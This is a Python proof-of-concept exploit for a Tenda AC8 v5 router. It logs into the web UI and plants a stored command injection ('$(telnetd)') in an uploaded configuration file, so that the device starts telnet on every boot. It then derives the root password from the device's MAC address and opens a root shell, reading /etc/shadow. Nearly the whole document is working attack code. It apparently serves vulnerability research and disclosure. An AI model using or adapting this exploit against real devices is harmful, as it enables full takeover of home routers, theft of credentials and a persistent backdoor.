#!/usr/bin/env python3
"""
Tenda AC8 - Stored Command Injection via Config Upload → Remote Root Shell

Vulnerability: Stored OS command injection in /bin/netctrl's
route_set_user_policy_rule() function. Policy rule values read from
the config store via GetValue("wans.policy.listN") are parsed by sscanf
and interpolated as %s directly into doSystemCmd() calls that construct
iptables commands. No sanitization is performed.

Exploit Strategy: Upload a crafted config file containing a malicious
wans.policy.list1 value with embedded shell command substitution.
After the device reboots with the new config, netctrl processes the
injected rule and executes the attacker's command as root.

Config value format (semicolon-delimited):
  IP_range;dest_IP;port_start-port_end;mark;enabled

Injection target — dest_IP field (acStack_10c), used as %s in:
  doSystemCmd("iptables -t mangle -A Xpolicy ... -d %s ...", acStack_10c)

Injected value:
  192.168.0.1-192.168.0.2;$(telnetd);80-443;1;1

This causes system() to evaluate $(telnetd), starting telnetd on port 23
before iptables processes the (now-empty) -d argument.

Attack flow:
  Step 1: Login to httpd with current password
  Step 2: Download current config via /cgi-bin/DownloadCfg (preserve settings)
  Step 3: Inject wans.policy.enable=1 + wans.policy.list1 with payload
  Step 4: Upload modified config via /cgi-bin/UploadCfg (triggers reboot)
  Step 5: Wait for device to reboot (~60s)
  Step 6: netctrl route_init() → checks wans.policy.enable==1 →
          route_set_user_policy_rule() → doSystemCmd() → telnetd
  Step 7: Connect to telnet (port 23) → login as root

Why this works:
  - cfm stores config values verbatim (no shell metacharacter escaping)
  - GetValue reads the raw string including $() into a stack buffer
  - sscanf("%[^;]") copies everything up to the semicolon — including $()
  - doSystemCmd() passes the format string to system(), which invokes sh -c
  - The shell evaluates $(telnetd) before iptables processes its arguments
  - telnetd daemonizes immediately, surviving any subsequent crash
  - The injection persists in config — triggers on every boot until cleared

Critical gate: route_init() only calls route_set_user_policy_rule() when
  GetValue("wans.policy.enable") == "1". Without this key, the injected
  policy rule is never processed. The POC sets this key in the config.

Telnet root login:
  - Root password derived from MAC address (cnsl_safe algorithm)
  - MAC octets [4],[5] → "{mac[4]:02x}1w6lm2p_955{mac[5]:02x}" → base64
  - MAC auto-detected from ARP table
  - Special case: MAC 00:90:4c:88:88:88 → password "Fireitup"

Binary: /bin/netctrl (MIPS32 little-endian, no mitigations)
Target: Tenda AC8 v5, firmware ac8v5_V16.03.50.11(955)_cn
"""

import argparse
import base64
import hashlib
import re
import socket
import subprocess
import sys
import telnetlib
import time
from urllib.parse import urlparse

import requests
import urllib3

urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

# ─── Exploit Parameters ───────────────────────────────────────────────
# Config file must start with this header (checked by UploadCfg handler)
CONFIG_HEADER = '#The word of "Default" must not be removed\r\nDefault\r\n'

# Config file must contain this separator (checked by tpi_sys_cfg_upload)
CONFIG_SEPARATOR = "##the public configure end##"

# Command to inject — telnetd daemonizes by default on BusyBox
INJECT_CMD = "telnetd"

# Malicious policy rule: dest_IP field contains $(telnetd)
# Format: IP_range;dest_IP;port_start-port_end;mark;enabled
# sscanf: "%[^;];%[^;];%u-%u;%u;%d"
MALICIOUS_RULE = f"192.168.0.1-192.168.0.2;$({INJECT_CMD});80-443;1;1"

DEFAULT_USERNAME = "admin"
TIMEOUT = 10
REBOOT_WAIT = 70  # seconds to wait for device reboot
FORM_CONTENT_TYPE = {"Content-Type": "application/x-www-form-urlencoded"}


def hash_password(plaintext):
    """
    Hash a plaintext password to match the web UI's login flow.

    The Tenda web UI (login.js) sends hex_md5(password) to /login/Auth,
    not the plaintext password. The server stores the MD5 hash in g_Pass.

    Empty password (factory reset) stays empty — no hashing needed.
    """
    if not plaintext:
        return ""
    return hashlib.md5(plaintext.encode()).hexdigest()


def check_alive(base_url):
    """Check if httpd is responding."""
    try:
        requests.get(base_url, timeout=TIMEOUT, allow_redirects=True)
        return True
    except requests.exceptions.RequestException:
        return False


def get_mac_from_arp(target_host):
    """
    Get the target's MAC address from the local ARP table.

    We've already communicated with the router, so its MAC
    should be in the ARP cache.
    """
    try:
        result = subprocess.run(
            ["ip", "neigh", "show", target_host],
            capture_output=True, text=True, timeout=5,
        )
        if result.returncode == 0 and result.stdout.strip():
            match = re.search(r"([0-9a-fA-F]{2}(?::[0-9a-fA-F]{2}){5})", result.stdout)
            if match:
                return match.group(1).lower()
    except FileNotFoundError:
        pass

    try:
        result = subprocess.run(
            ["arp", "-n", target_host],
            capture_output=True, text=True, timeout=5,
        )
        if result.returncode == 0:
            match = re.search(r"([0-9a-fA-F]{2}(?:[:-][0-9a-fA-F]{2}){5})", result.stdout)
            if match:
                return match.group(1).replace("-", ":").lower()
    except FileNotFoundError:
        pass

    return None


def derive_telnet_password(mac):
    """
    Derive the UART/telnet root password from the device MAC address.

    Algorithm (from cnsl_safe):
      1. Take MAC octets [4] and [5] (0-indexed)
      2. Format: "{mac[4]:02x}1w6lm2p_955{mac[5]:02x}"
      3. Base64-encode the result

    Special case: MAC 00:90:4c:88:88:88 → "Fireitup"
    """
    octets = [int(b, 16) for b in mac.split(":")]

    if octets == [0x00, 0x90, 0x4C, 0x88, 0x88, 0x88]:
        return "Fireitup"

    pre_encode = f"{octets[4]:02x}1w6lm2p_955{octets[5]:02x}"
    return base64.b64encode(pre_encode.encode()).decode()


def step1_login(base_url, session, password):
    """
    Login to httpd with the current device password.

    R7WebsSecurityHandler authenticates via /login/Auth:
      1. strcmp(username, g_User) → "admin" match
      2. strcmp(password, &g_Pass) → MD5 hash match
      3. Sets session cookie for subsequent requests

    The web UI (login.js) sends hex_md5(password), so we do the same.
    """
    print(f"[*] Step 1: Logging in to httpd...")

    # Hash the password to match the web UI's hex_md5() behavior
    password_hash = hash_password(password)
    if password:
        print(f"    Password: {password} → MD5: {password_hash}")

    data = f"username={DEFAULT_USERNAME}&password={password_hash}"
    try:
        r = session.post(
            f"{base_url}/login/Auth",
            data=data,
            headers=FORM_CONTENT_TYPE,
            allow_redirects=False,
            timeout=TIMEOUT,
        )
    except requests.exceptions.RequestException as e:
        print(f"[-] Login request failed: {e}")
        return False

    print(f"    Response: HTTP {r.status_code}")

    set_cookie = r.headers.get("Set-Cookie", "")
    if "password=" in set_cookie or session.cookies.get("password"):
        print(f"[+] Login successful!")
        return True

    location = r.headers.get("Location", "")
    if "main.html" in location or "index.html" in location:
        print(f"[+] Login successful! (redirect to {location})")
        return True

    # No password set — may not need auth
    if not password:
        print(f"[*] No password set, proceeding without auth...")
        return True

    print(f"[-] Login failed. Check password.")
    return False


def step2_download_config(base_url, session):
    """
    Download the current device configuration via /cgi-bin/DownloadCfg.

    DownloadCfg handler:
      1. systool_download_file_handle(0, filename) — generates config dump
      2. Prepends: #The word of "Default" must not be removed\\r\\nDefault\\r\\n
      3. Sends key=value config lines with \\r\\n line endings
    """
    print(f"[*] Step 2: Downloading current config...")

    try:
        r = session.get(
            f"{base_url}/cgi-bin/DownloadCfg",
            timeout=TIMEOUT,
        )
    except requests.exceptions.RequestException as e:
        print(f"[-] Config download failed: {e}")
        return None

    if r.status_code != 200:
        print(f"[-] Config download returned HTTP {r.status_code}")
        return None

    config = r.content.decode("latin-1")
    lines = config.split("\n")
    print(f"[+] Downloaded config: {len(r.content)} bytes, {len(lines)} lines")

    # Verify it looks like a valid config
    if "Default" not in config[:100]:
        print(f"[-] Config doesn't look valid (missing header)")
        print(f"    First 200 bytes: {config[:200]}")
        return None

    return config


def step3_inject_config(config):
    """
    Inject the malicious wans.policy values into the config.

    Three keys are required:
      - wans.policy.enable=1    ← gate in route_init(), MUST be "1"
      - wans.policy.listnum=1   ← number of rules to process
      - wans.policy.list1=...   ← the injected rule with $(telnetd)

    Without wans.policy.enable=1, route_init() skips processing entirely
    and route_set_user_policy_rule() is never called at boot.

    The injected value contains $(telnetd) in the dest_IP field.
    When netctrl's route_set_user_policy_rule() processes this:
      1. GetValue("wans.policy.list1", buf) → reads our string
      2. sscanf(buf, "%[^;];%[^;];...", ..., acStack_10c, ...) → acStack_10c = "$(telnetd)"
      3. doSystemCmd("iptables ... -d %s ...", acStack_10c) → system() evaluates $(telnetd)
    """
    print(f"[*] Step 3: Injecting command payload into config...")
    print(f"    Payload: wans.policy.enable=1")
    print(f"    Payload: wans.policy.listnum=1")
    print(f"    Payload: wans.policy.list1={MALICIOUS_RULE}")

    # Remove any existing wans.policy entries
    lines = config.split("\r\n")
    filtered = [l for l in lines if not l.startswith("wans.policy.")]

    # Find the separator position
    sep_idx = None
    for i, line in enumerate(filtered):
        if CONFIG_SEPARATOR in line:
            sep_idx = i
            break

    # The three required keys for the injection to fire at boot:
    #   enable=1  → passes the gate in route_init()
    #   listnum=1 → tells route_set_user_policy_rule() how many rules to read
    #   list1=... → the actual malicious rule
    inject_lines = [
        "wans.policy.enable=1",
        "wans.policy.listnum=1",
        f"wans.policy.list1={MALICIOUS_RULE}",
    ]

    if sep_idx is None:
        # No separator found — add one after injection
        print(f"    Adding config separator (not found in original)")
        inject_lines.append(CONFIG_SEPARATOR)
        inject_lines.append("")
        filtered.extend(inject_lines)
    else:
        # Insert before separator
        for i, line in enumerate(inject_lines):
            filtered.insert(sep_idx + i, line)

    modified = "\r\n".join(filtered)

    # Verify header is intact
    if not modified.startswith("#"):
        print(f"[-] Modified config lost its header!")
        return None

    # Verify separator exists
    if CONFIG_SEPARATOR not in modified:
        print(f"[-] Modified config missing separator!")
        return None

    print(f"[+] Config modified: {len(modified)} bytes")
    print(f"    Gate:            wans.policy.enable=1 (route_init check)")
    print(f"    Injection point: wans.policy.list1")
    print(f"    Sink:            doSystemCmd(\"iptables ... -d $(telnetd) ...\")")
    return modified


def step4_upload_config(base_url, session, config):
    """
    Upload the modified config via /cgi-bin/UploadCfg.

    UploadCfg handler:
      1. webCgiGetUploadFile() — parses multipart upload, extracts file content
      2. strncmp(data, "#The word of \\"Default\\"...", len) — validates header
      3. systool_upgradefile_handle(1, data, len) → tpi_sys_cfg_upload(data)
      4. tpi_sys_cfg_upload:
         a. Splits at "##the public configure end##"
         b. Writes to /var/default.cfg and /var/default_url.cfg
         c. doSystemCmd("cfm Upload") — loads all key=value pairs into config store
         d. Restores serial number, WPS pins, MAC addresses
         e. CommitCfm() — persists to flash
      5. systool_sys_handle(0) — REBOOTS the device

    After reboot:
      - netctrl starts from init
      - route_init() checks wans.policy.enable == "1" → calls route_set_user_policy_rule()
      - GetValue("wans.policy.list1") returns our injected value
      - doSystemCmd() passes it to system() → $(telnetd) evaluated → telnetd starts
    """
    print(f"[*] Step 4: Uploading poisoned config...")
    print(f"    POST /cgi-bin/UploadCfg ({len(config)} bytes)")
    print(f"    Device will reboot after upload completes.")

    config_bytes = config.encode("latin-1")

    # Form field name is "filename" (from system_backup.html)
    files = {
        "filename": ("default.cfg", config_bytes, "application/octet-stream"),
    }

    try:
        r = session.post(
            f"{base_url}/cgi-bin/UploadCfg",
            files=files,
            allow_redirects=False,
            timeout=30,  # longer timeout — config processing takes time
        )
        print(f"    Response: HTTP {r.status_code}")
        location = r.headers.get("Location", "")
        if "redirect.html" in location:
            print(f"[+] Config accepted! Device is rebooting...")
            return True
        elif r.status_code in (200, 301, 302):
            print(f"[+] Upload completed (HTTP {r.status_code}). Device may be rebooting...")
            return True
        else:
            print(f"[-] Unexpected response: {r.status_code}")
            print(f"    Body: {r.text[:300]}")
            return False
    except requests.exceptions.ConnectionError:
        # Connection reset likely means the device is rebooting
        print(f"[+] Connection reset — device is rebooting!")
        return True
    except requests.exceptions.ReadTimeout:
        print(f"[+] Read timeout — device is rebooting!")
        return True


def step5_wait_for_reboot(base_url):
    """
    Wait for the device to finish rebooting.

    Typical Tenda AC8 reboot cycle: ~45-60 seconds.
    We poll httpd until it responds again.
    """
    print(f"[*] Step 5: Waiting for device to reboot ({REBOOT_WAIT}s max)...")

    # First, wait for it to go down
    time.sleep(5)
    down = False
    for i in range(10):
        if not check_alive(base_url):
            down = True
            print(f"    [{i*2+5}s] Device is down...")
            break
        time.sleep(2)

    if not down:
        print(f"    Device never went down — config upload may have failed.")
        # Continue anyway, maybe it rebooted very fast

    # Now wait for it to come back
    start = time.time()
    while time.time() - start < REBOOT_WAIT:
        elapsed = int(time.time() - start)
        if check_alive(base_url):
            print(f"[+] Device is back online! (after ~{elapsed}s)")
            # Give netctrl a few seconds to start and process config
            print(f"    Waiting 5s for netctrl to process policy rules...")
            time.sleep(5)
            return True
        time.sleep(3)

    print(f"[-] Device did not come back within {REBOOT_WAIT}s")
    return False


def step6_verify_telnet(target_host):
    """
    Verify telnetd is running by connecting to port 23.

    After netctrl processes the injected policy rule, doSystemCmd evaluates
    $(telnetd), starting telnetd as a background daemon on port 23.
    """
    print(f"[*] Step 6: Checking for telnet on {target_host}:23...")

    for attempt in range(5):
        try:
            sock = socket.create_connection((target_host, 23), timeout=5)
            banner = sock.recv(1024)
            sock.close()
            print(f"[+] TELNET IS OPEN on {target_host}:23!")
            if banner:
                print(f"    Banner: {banner[:200]}")
            return True
        except ConnectionRefusedError:
            print(f"    Attempt {attempt + 1}/5: Connection refused, retrying...")
            time.sleep(3)
        except socket.timeout:
            print(f"    Attempt {attempt + 1}/5: Timeout, retrying...")
            time.sleep(3)
        except OSError as e:
            print(f"    Attempt {attempt + 1}/5: {e}, retrying...")
            time.sleep(3)

    print(f"[-] Could not connect to telnet.")
    return False


def step7_telnet_login(target_host, password):
    """
    Login to telnet as root with the MAC-derived password.

    Tenda's telnetd uses /bin/login → authenticates against /etc/shadow.
    Root password set by cnsl_safe at boot, derived from MAC address.
    """
    print(f"[*] Step 7: Logging into telnet as root...")
    print(f"    Password: {password}")

    try:
        tn = telnetlib.Telnet(target_host, 23, timeout=10)

        tn.read_until(b"login: ", timeout=5)
        tn.write(b"root\n")

        tn.read_until(b"assword:", timeout=5)
        tn.write(password.encode() + b"\n")

        time.sleep(1)
        response = tn.read_very_eager()
        response_text = response.decode("ascii", errors="replace")

        if "incorrect" in response_text.lower() or "denied" in response_text.lower():
            print(f"[-] Login failed — password may be wrong.")
            print(f"    Response: {response_text.strip()[:200]}")
            tn.close()
            return False

        tn.write(b"cat /proc/version\n")
        time.sleep(0.5)
        ver_output = tn.read_very_eager().decode("ascii", errors="replace")

        print(f"[+] ROOT SHELL ACTIVE!")
        if ver_output.strip():
            print(f"    $ cat /proc/version")
            print(f"    {ver_output.strip()[:200]}")

        tn.write(b"cat /etc/shadow\n")
        time.sleep(0.5)
        shadow_output = tn.read_very_eager().decode("ascii", errors="replace")
        if shadow_output.strip():
            print(f"    $ cat /etc/shadow")
            print(f"    {shadow_output.strip()[:500]}")

        tn.close()
        return True

    except EOFError:
        print(f"[-] Telnet connection closed unexpectedly.")
        return False
    except Exception as e:
        print(f"[-] Telnet login failed: {e}")
        return False


def main():
    parser = argparse.ArgumentParser(
        description="Tenda AC8 Stored Command Injection via Config Upload → Remote Root Shell",
    )
    parser.add_argument(
        "--target", default="http://192.168.0.1",
        help="Target URL (default: http://192.168.0.1)",
    )
    parser.add_argument(
        "--current-password", default="",
        help="Current web admin password in plaintext (auto-hashed to MD5 to match web UI). Empty for factory reset.",
    )
    parser.add_argument(
        "--mac", default=None,
        help="Device MAC address (e.g. AA:BB:CC:DD:EE:FF). Auto-detected from ARP if omitted.",
    )
    args = parser.parse_args()

    base_url = args.target.rstrip("/")
    target_host = urlparse(base_url).hostname

    print("=" * 72)
    print("  Tenda AC8 — Stored Command Injection via Config Upload")
    print("  → netctrl route_set_user_policy_rule → doSystemCmd → Root Shell")
    print("=" * 72)
    print()
    print(f"  Target:         {base_url}")
    print(f"  Injection:      wans.policy.list1={MALICIOUS_RULE}")
    print(f"  Sink:           doSystemCmd(\"iptables ... -d $({INJECT_CMD}) ...\")")
    print(f"  Effect:         system() evaluates $({INJECT_CMD}) → telnetd on port 23")
    print(f"  Persistence:    survives reboots (stored in cfm config)")
    print()

    # Verify target is up
    print("[*] Checking target is reachable...")
    if not check_alive(base_url):
        print("[-] Cannot reach httpd. Check target IP.")
        sys.exit(1)
    print("[+] httpd is responding.")
    print()

    session = requests.Session()

    # Step 1: Login
    if not step1_login(base_url, session, args.current_password):
        print("\n[-] Authentication failed.")
        sys.exit(1)
    print()

    # Step 2: Download current config
    config = step2_download_config(base_url, session)
    if config is None:
        print("\n[-] Could not download config.")
        sys.exit(1)
    print()

    # Step 3: Inject malicious policy rule
    modified = step3_inject_config(config)
    if modified is None:
        print("\n[-] Config injection failed.")
        sys.exit(1)
    print()

    # Step 4: Upload poisoned config (triggers reboot)
    if not step4_upload_config(base_url, session, modified):
        print("\n[-] Config upload failed.")
        sys.exit(1)
    print()

    # Step 5: Wait for reboot
    if not step5_wait_for_reboot(base_url):
        print("\n[-] Device did not come back. It may need manual recovery.")
        sys.exit(1)
    print()

    # Step 6: Verify telnet
    telnet_ok = step6_verify_telnet(target_host)
    print()

    # Step 7: Get MAC, derive password, login
    login_ok = False
    mac = None
    password = None
    if telnet_ok:
        if args.mac:
            mac = args.mac.strip().lower().replace("-", ":")
            print(f"[*] Using provided MAC: {mac}")
        else:
            print(f"[*] Looking up MAC address from ARP table...")
            mac = get_mac_from_arp(target_host)
            if mac:
                print(f"[+] Found MAC: {mac}")
            else:
                print(f"[-] Could not find MAC in ARP table.")
                print(f"    Use --mac AA:BB:CC:DD:EE:FF to provide it manually.")

        if mac:
            password = derive_telnet_password(mac)
            print(f"[+] Derived root password: {password}")
            print()
            login_ok = step7_telnet_login(target_host, password)

    # Summary
    print()
    print("=" * 72)
    if login_ok:
        print("  RESULT: ROOT SHELL OBTAINED — FULL DEVICE COMPROMISE")
        print()
        print("  Kill chain:")
        print(f"    1. Logged in to httpd, downloaded config")
        print(f"    2. Injected wans.policy.enable=1 + list1=$({INJECT_CMD})")
        print(f"    3. Uploaded poisoned config → device rebooted")
        print(f"    4. netctrl route_init() → enable==1 → route_set_user_policy_rule()")
        print(f"    5. doSystemCmd(\"iptables ... -d $({INJECT_CMD}) ...\") → telnetd")
        print(f"    6. MAC {mac} → root password: {password}")
        print(f"    7. Authenticated root shell via telnet")
        print()
        print(f"  Reconnect:    telnet {target_host}")
        print(f"  Login:        root / {password}")
        print()
        print(f"  NOTE: The injection persists in config. telnetd will start")
        print(f"  on every boot until the config is cleared (factory reset).")
    elif telnet_ok:
        print("  RESULT: TELNET IS OPEN (command injection successful)")
        print()
        print(f"  Port 23 is listening but login {'needs MAC' if not mac else 'failed'}.")
        if mac and password:
            print(f"  Tried:  root / {password}")
        print()
        print(f"  Connect manually:  telnet {target_host}")
        if not mac:
            print(f"  Find MAC:          arp -n {target_host}")
    else:
        print("  RESULT: Telnet not detected after reboot.")
        print()
        print(f"  The config was uploaded and the device rebooted,")
        print(f"  but telnetd doesn't appear to be running.")
        print(f"  Possible causes:")
        print(f"    - netctrl hasn't processed policy rules yet (try again)")
        print(f"    - busybox telnetd not available on this firmware")
        print(f"    - config upload was rejected or overwritten on boot")
        print()
        print(f"  Debug: check UART console for netctrl log messages")
    print("=" * 72)


if __name__ == "__main__":
    main()
